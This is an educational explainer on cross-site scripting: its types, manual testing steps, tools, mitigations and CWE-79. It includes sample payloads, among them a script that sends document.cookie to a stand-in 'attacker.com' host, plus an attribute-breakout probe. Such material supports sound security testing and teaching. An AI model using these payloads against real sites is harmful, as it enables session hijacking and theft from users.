# What is XSS (Cross-Site Scripting)?

Cross-Site Scripting (XSS) lets attackers inject scripts that run in another user's browser. It is still in the OWASP Top 10 because developers keep trusting user input in HTML contexts.

## Types

- **Reflected** - payload in URL/form, bounces back in response
- **Stored** - payload saved (comments, profiles), hits every visitor
- **DOM-based** - JavaScript reads attacker input (`location.hash`) and writes it to the page

## Test payloads

```html
<!-- Quick probe -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie theft (impact demo only, with authorization) -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - Repeater, Intruder for context fuzzing
- [XSS Hunter](https://xsshunter.com/) - blind XSS callback platform
- [dalfox](https://github.com/hahwul/dalfox) - parameter-based XSS scanner

## Manual testing

1. Identify reflection points: search, error messages, profile fields
2. Inject HTML tags; see if `<b>`, `<img>` render
3. Break out of attribute context: `" onmouseover=alert(1) `
4. Test in different roles (stored XSS may only show to admins)

## Mitigation

- Context-aware output encoding (HTML, attribute, JS, URL)
- Content-Security-Policy (CSP) with strict `script-src`
- HTTPOnly cookies (limits session theft, not all XSS impact)

## Deep dive

- [XSS - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting)

## CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation
